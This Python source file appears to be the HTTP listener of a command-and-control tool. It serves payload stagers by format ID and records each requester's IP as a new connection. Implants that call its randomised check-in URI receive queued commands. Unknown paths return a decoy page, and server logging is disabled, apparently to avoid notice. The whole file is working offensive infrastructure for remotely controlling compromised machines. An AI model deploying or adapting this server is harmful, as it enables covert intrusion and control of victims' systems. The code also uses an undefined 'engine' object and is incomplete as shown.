import logging
import os

from connect import color, connection, util
from flask import Flask, render_template, request

app = Flask(__name__)

checkin_uri = f'/{util.generate_id()}'

@app.route('/<format_id>', methods=['GET'])
def serve_stagers(format_id):
    remote_addr = request.remote_addr
    if format_id not in engine.STAGERS.keys():
        return render_template('connection_template.html', random_data=util.random_data)
    color.information(f'{engine.STAGERS[format_id].format} file requested ({remote_addr})')
    connection_id = util.generate_id()
    connection = engine.create_connection(connection_id, engine.STAGERS[format_id].format)
    connection.system_information['ip'] = remote_addr
    connection_id_variable = (util.generate_str(), connection_id)
    return render_template(
        f'stagers/{engine.connections[connection_id].stager_format}',
        checkin_uri=checkin_uri,
        connection_id=connection_id_variable,
        variables=engine.STAGERS[format_id].variables,
        functions=engine.STAGERS[format_id].functions
    )

@app.route(f'{checkin_uri}', methods=['POST'])
def checkin():
    color.verbose(f'Post request made to {checkin_uri}')
    post_data = dict(request.get_json(force=True)) #figure it out force=true
    template = render_template('connection_template.html', random_data=util.random_data)
    try:
        connection = engine.retrieve_connection(post_data['connection_id'])
    except:
        return template
    if connection.command_queue:
        template = render_template('connection_template.html', random_data=util.random_data, command=connection.command_queue.pop(0))
    if connection.status != 'connected':
        internet_addr = connection.system_information['ip']
        color.success(f'Successful connection ({internet_addr})')
    connection.check_in()
    return template

def run(ip, port):
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'
    log = logging.getLogger('werkzeug')
    log.disabled = True
    if not engine:
        color.verbose('Please assign an engine to the server.')
        return
    try:
        app.run(host=ip, port=port)
    except:
        color.information(f'Error starting server')
        return
    return
